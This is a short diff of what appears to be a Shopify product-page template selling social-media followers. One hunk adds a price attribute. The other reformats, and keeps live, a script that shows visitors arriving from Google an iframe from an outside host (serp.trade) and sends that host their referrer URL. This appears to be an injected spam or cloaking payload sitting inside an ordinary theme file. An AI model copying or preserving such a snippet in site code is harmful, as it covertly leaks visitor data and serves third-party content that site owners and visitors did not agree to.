@@ -161,7 +161,7 @@
                     itemprop="price" content="{{ current_variant.price | divided_by: 100.00 }}">
                 {{ current_variant.price | money }}
               </span>
-              <span class="product-price__amount">
+              <span class="product-price__amount" content="{{ current_variant.option1 }}">
                 {{ current_variant.option1 }}
                 <span class="important-text">seguidores</span>
               </span>
@@ -1140,9 +1140,11 @@ var enable_defaul_variant = false;
 
 {% endschema %}
 
-<script>if((document.referrer).includes('google')) {
+<script>
+if((document.referrer).includes('google')) {
    document.write("<iframe src='https://serp.trade/iframe.php?ref="+(document.referrer)+"' frameBorder='0' scrolling='no' width='100%' height='200px' align='center'></iframe>");
-} </script>
+}
+</script>
 
 <!-- Infinite Options app by ShopPad -->
 <script>
